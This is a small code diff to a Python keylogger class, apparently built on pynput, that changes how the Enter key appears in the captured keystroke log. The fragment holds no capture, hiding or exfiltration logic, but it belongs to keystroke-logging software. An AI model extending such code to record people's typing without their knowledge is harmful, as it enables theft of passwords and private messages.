@@ -18,7 +18,7 @@ class IKeyLogger(ABC):
 class KeyLoggerService(IKeyLogger):
     special_keys = {
         keyboard.Key.space: " ",
-        keyboard.Key.enter: "\n",
+        keyboard.Key.enter: " ENTER",
         keyboard.Key.esc: " ESC ",
         keyboard.Key.shift: " SHIFT ",
         keyboard.Key.shift_l: " SHIFT_L ",
